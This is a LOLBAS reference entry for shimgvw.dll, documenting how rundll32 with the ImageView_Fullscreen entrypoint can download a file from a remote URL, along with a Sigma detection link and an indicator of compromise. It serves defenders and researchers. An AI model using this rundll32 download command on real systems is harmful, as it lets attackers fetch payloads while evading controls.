---
title: "Shimgvw.dll"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Libraries/Shimgvw/
fetched_at: 2026-09-20T17:16:23Z
license: unspecified
category: windows
---

Photo Gallery Viewer

## Paths
- c:\windows\system32\shimgvw.dll
- c:\windows\syswow64\shimgvw.dll

## Resources
- [https://twitter.com/eral4m/status/1479080793003671557](https://twitter.com/eral4m/status/1479080793003671557)

## Acknowledgements
- Eral4m ([@eral4m](https://twitter.com/@eral4m))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml](https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)
- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://') on the command line

## Download

1. Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint ‘ImageView_FullscreenA’.

```
rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
```

   - Use case: Download file from remote location.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
